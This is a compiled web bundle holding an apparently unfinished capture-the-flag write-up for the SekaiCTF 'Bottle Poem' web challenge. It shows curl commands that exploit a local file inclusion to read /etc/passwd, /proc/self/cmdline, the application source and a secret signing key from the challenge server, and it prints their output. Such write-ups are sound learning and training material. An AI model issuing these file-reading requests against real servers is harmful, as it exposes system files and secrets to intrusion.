(window.webpackJsonp=window.webpackJsonp||[]).push([[3],{90:function(t,s,n){"use strict";n.r(s);var e=n(1),a=function(t){var s,n,e,a,r=(e="post",a="ctf, sekaiCTF",(s={}).internal=n=void 0,s.contentType="markdown",s.slug="sekai-ctf-1",s.content=n,s.title="Sekai CTF - Bottle Poem",s.layout=e,s.date="2022-10-12 20:23:00",s.tags=[a],s.markdownHeadings=[{text:"Problem Statement",slug:"problem-statement",level:5}],s.excerpt="<p>Come and read poems in the bottle.</p>\n",s.createdAt=new Date(166563138e4),s.updatedAt=new Date(NaN),s.type=e,s.permalink="/posts/sekai-ctf-1",s.assets={},s.attributes=s,s.tagsInfo=[{name:a,permalink:"/tags/ctf-sekaictf"}],s),o=t.options.beforeCreate||[];t.options.beforeCreate=[function(){this.$page=r}].concat(o);["layout","transition"].forEach((function(s){var n=t.options.PageComponent;n&&(t.options[s]=n[s]),void 0===t.options[s]&&(t.options[s]=r[s])})),t.options.name="page-wrapper-"+r.slug.replace(/[^0-9a-z\-]/i,"-")},r=Object(e.a)({},(function(){var t=this,s=t.$createElement,n=t._self._c||s;return n("layout-manager",[n("h5",{attrs:{id:"problem-statement"}},[t._v("Problem Statement")]),t._v(" "),n("p",[t._v("Come and read poems in the bottle.")]),t._v(" "),n("p",[t._v("No bruteforcing is required to solve this challenge. Please do not use scanner tools. Rate limiting is applied. Flag is executable on server.")]),t._v(" "),n("p",[t._v("Author: bwjy")]),t._v(" "),n("p",[n("a",{attrs:{href:"http://bottle-poem.ctf.sekai.team",target:"_blank",rel:"noopener noreferrer"}},[t._v("Webpage: http://bottle-poem.ctf.sekai.team")])]),t._v(" "),n("hr"),t._v(" "),n("p",[t._v("In this challenge we are greeted with 3 links, as we click on them we notice the URL changes. Respectively ~")]),t._v(" "),n("div",{pre:!0,attrs:{class:"saber-highlight","data-lang":""}},[n("pre",{pre:!0,attrs:{class:"saber-highlight-code language-text"}},[n("code",{pre:!0,attrs:{class:"language-text"}},[t._v("http://bottle-poem.ctf.sekai.team/show?id=spring.txt\nhttp://bottle-poem.ctf.sekai.team/show?id=Auguries_of_Innocence.txt\nhttp://bottle-poem.ctf.sekai.team/show?id=The_tiger.txt")])])]),n("p",[t._v("Something fishy about this is that it indicates quite possibly the filepath?\nLet's try to print something out")]),t._v(" "),n("p",[t._v("We can send a get request to the server using the terminal with "),n("code",{pre:!0},[t._v("curl")]),t._v(" "),n("code",{pre:!0},[t._v("curl http://bottle-poem.ctf.sekai.team/show?id=/etc/passwd")]),t._v("\nWe use "),n("code",{pre:!0},[t._v("/etc/passwd")]),t._v(" since most servers are on linux, and this file will always exist.")]),t._v(" "),n("p",[t._v("Sure enough, it's a "),n("a",{attrs:{href:"https://www.aptive.co.uk/blog/local-file-inclusion-lfi-testing/",target:"_blank",rel:"noopener noreferrer"}},[t._v("Local File Inclusion")])]),t._v(" "),n("div",{pre:!0,attrs:{class:"saber-highlight","data-lang":""}},[n("pre",{pre:!0,attrs:{class:"saber-highlight-code language-text"}},[n("code",{pre:!0,attrs:{class:"language-text"}},[t._v("root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin")])])]),n("p",[t._v("This proves we can read the files on this server. Now the question is, what file do we need to read to get the flag?\n"),n("a",{attrs:{href:"https://www.tecmint.com/exploring-proc-file-system-in-linux/",target:"_blank",rel:"noopener noreferrer"}},[t._v("https://www.tecmint.com/exploring-proc-file-system-in-linux/")])]),t._v(" "),n("p",[n("code",{pre:!0},[t._v("/proc")]),t._v(" directory is a psuedo directory, but it exists because everything is a file on linux.")]),t._v(" "),n("p",[n("code",{pre:!0},[t._v("/proc/self")]),t._v(" is When a process accesses this magic symbolic link, it\nresolves to the process's own /proc/[pid] directory.")]),t._v(" "),n("p",[n("code",{pre:!0},[t._v("/proc/[pid]/cmdline")]),t._v("\nThis read-only file holds the complete command line for\nthe process, unless the process is a zombie. In the\nlatter case, there is nothing in this file: that is, a\nread on this file will return 0 characters. The command-\nline arguments appear in this file as a set of strings\nseparated by null bytes ('\\0'), with a further null byte\nafter the last string.")]),t._v(" "),n("p",[t._v("Let's try reading this\n"),n("code",{pre:!0},[t._v("curl http://bottle-poem.ctf.sekai.team/show\\?id\\=/proc/self/cmdline -o result.txt")]),t._v("\nHere we are outputting the result into "),n("code",{pre:!0},[t._v("result.txt")]),t._v(" checking this file we see\n"),n("code",{pre:!0},[t._v("python3-u/app/app.py")])]),t._v(" "),n("p",[t._v("Now we have an entry point to work with! Let's open it up")]),t._v(" "),n("p",[n("code",{pre:!0},[t._v("curl http://bottle-poem.ctf.sekai.team/show\\?id\\=/app/app.py -o app.py")])]),t._v(" "),n("div",{pre:!0,attrs:{class:"saber-highlight","data-lang":"py"}},[n("pre",{pre:!0,attrs:{class:"saber-highlight-code language-py"}},[n("code",{pre:!0,attrs:{class:"language-py"}},[n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("from")]),t._v(" bottle "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("import")]),t._v(" route"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" run"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" template"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" request"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" response"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" error\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("from")]),t._v(" config"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("secret "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("import")]),t._v(" sekai\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("import")]),t._v(" os\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("import")]),t._v(" re\n\n\n"),n("span",{pre:!0,attrs:{class:"token decorator annotation punctuation"}},[t._v("@route")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"/"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("def")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("home")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("return")]),t._v(" template"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"index"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n\n\n"),n("span",{pre:!0,attrs:{class:"token decorator annotation punctuation"}},[t._v("@route")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"/show"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("def")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("index")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("\n    response"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("content_type "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"text/plain; charset=UTF-8"')]),t._v("\n    param "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" request"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("query"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("id")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("if")]),t._v(" re"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("search"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"^../app"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" param"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("\n        "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("return")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"No!!!!"')]),t._v("\n    requested_path "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" os"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("path"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("join"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("os"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("getcwd"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"/poems"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" param"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("try")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("\n        "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("with")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("open")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("requested_path"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("as")]),t._v(" f"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("\n            tfile "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" f"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("read"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("except")]),t._v(" Exception "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("as")]),t._v(" e"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("\n        "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("return")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"No This Poems"')]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("return")]),t._v(" tfile\n\n\n"),n("span",{pre:!0,attrs:{class:"token decorator annotation punctuation"}},[t._v("@error")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("404")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("def")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("error404")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("error"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("return")]),t._v(" template"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"error"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n\n\n"),n("span",{pre:!0,attrs:{class:"token decorator annotation punctuation"}},[t._v("@route")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"/sign"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("def")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("index")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("try")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("\n        session "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" request"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("get_cookie"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"name"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" secret"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("sekai"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n        "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("if")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("not")]),t._v(" session "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("or")]),t._v(" session"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"name"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("==")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"guest"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("\n            session "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"name"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"guest"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n            response"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("set_cookie"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"name"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" session"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" secret"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("sekai"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n            "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("return")]),t._v(" template"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"guest"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" name"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("session"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"name"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n        "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("if")]),t._v(" session"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"name"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("==")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"admin"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("\n            "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("return")]),t._v(" template"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"admin"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" name"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("session"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"name"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("except")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("\n        "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("return")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"pls no hax"')]),t._v("\n\n\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("if")]),t._v(" __name__ "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("==")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"__main__"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("\n    os"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("chdir"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("os"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("path"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("dirname"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("__file__"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n    run"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("host"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"0.0.0.0"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" port"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("8080")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")])])])]),n("p",[t._v("Key thing to note here are the routes! The poems are handled under "),n("code",{pre:!0},[t._v("/show")]),t._v(" but there's also "),n("code",{pre:!0},[t._v("/sign")]),t._v(". Visiting this on the webpages brings this\n"),n("img",{attrs:{src:"https://files.catbox.moe/8ylti8.png",alt:"image"}})]),t._v(" "),n("p",[t._v("Looking closely at the imports we can infer the next filepath to explore.")]),t._v(" "),n("p",[n("code",{pre:!0},[t._v("curl http://bottle-poem.ctf.sekai.team/show\\?id\\=/app/config/secret.py")]),t._v(" "),n("code",{pre:!0},[t._v('sekai = "Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu"')]),t._v("\nOkay seems like we are getting somewhere. However that's where my knowledge depths take a stop. I'll update this blog later when I make some progress")])])}),[],!1,null,null,null);"function"==typeof a&&a(r);s.default=r.exports}}]);